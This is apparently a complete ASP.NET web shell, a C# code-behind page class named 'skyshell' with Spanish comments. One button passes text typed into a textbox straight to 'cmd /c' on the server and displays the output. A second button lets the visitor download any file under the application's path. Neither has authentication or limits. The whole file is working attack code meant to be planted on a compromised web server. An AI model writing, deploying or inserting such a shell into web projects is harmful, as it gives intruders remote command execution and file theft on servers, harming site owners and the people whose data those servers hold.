using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;

public partial class skyshell : System.Web.UI.Page
{
    string command;
    protected void Page_Load(object sender, EventArgs e)
    {

    }
    protected void Button1_Click(object sender, EventArgs e)
    {
        command = __txtcommand.Text;
        System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo("cmd", "/c " + command);
        // Indicamos que la salida del proceso se redireccione en un Stream
        procStartInfo.RedirectStandardOutput = true;
        procStartInfo.UseShellExecute = false;
        //Indica que el proceso no despliegue una pantalla negra (El proceso se ejecuta en background)
        procStartInfo.CreateNoWindow = false;
        //Inicializa el proceso
        System.Diagnostics.Process proc = new System.Diagnostics.Process();
        proc.StartInfo = procStartInfo;
        proc.Start();
        //Consigue la salida de la Consola(Stream) y devuelve una cadena de texto
        string result = proc.StandardOutput.ReadToEnd();
        __txt_console.Text = result;
    
    }
    protected void Button2_Click(object sender, EventArgs e)
    {

        string filepath = System.Web.Hosting.HostingEnvironment.ApplicationPhysicalPath + __txtpath.Text;

        FileInfo file = new FileInfo(filepath);

        if (file.Exists)
        {
            lblMensaje.Text = "Descargando...";
            Response.ClearContent();
            Response.AddHeader("Content-Disposition", String.Format("attachment; filename={0}", file.Name));
            Response.AddHeader("Content-Length", file.Length.ToString());
            Response.ContentType = ReturnFiletype(file.Extension.ToLower());
            Response.TransmitFile(file.FullName);
            Response.End();
        }
        else
        {
            lblMensaje.Text = "Archivo no existe";
        }

        
    }

    public static string ReturnFiletype(string fileExtension)
    {
        switch (fileExtension)
        {
            case ".htm":
            case ".html":
            case ".log":
                return "text/HTML";
            case ".txt":
                return "text/plain";
            case ".doc":
                return "application/ms-word";
            case ".tiff":
            case ".tif":
                return "image/tiff";
            case ".asf":
                return "video/x-ms-asf";
            case ".avi":
                return "video/avi";
            case ".zip":
                return "application/zip";
            case ".xls":
            case ".csv":
                return "application/vnd.ms-excel";
            case ".gif":
                return "image/gif";
            case ".jpg":
            case "jpeg":
                return "image/jpeg";
            case ".bmp":
                return "image/bmp";
            case ".wav":
                return "audio/wav";
            case ".mp3":
                return "audio/mpeg3";
            case ".mpg":
            case "mpeg":
                return "video/mpeg";
            case ".rtf":
                return "application/rtf";
            case ".asp":
                return "text/asp";
            case ".pdf":
                return "application/pdf";
            case ".fdf":
                return "application/vnd.fdf";
            case ".ppt":
                return "application/mspowerpoint";
            case ".dwg":
                return "image/vnd.dwg";
            case ".msg":
                return "application/msoutlook";
            case ".xml":
            case ".sdxl":
                return "application/xml";
            case ".xdp":
                return "application/vnd.adobe.xdp+xml";
            default:
                return "application/octet-stream";
        }
    }
}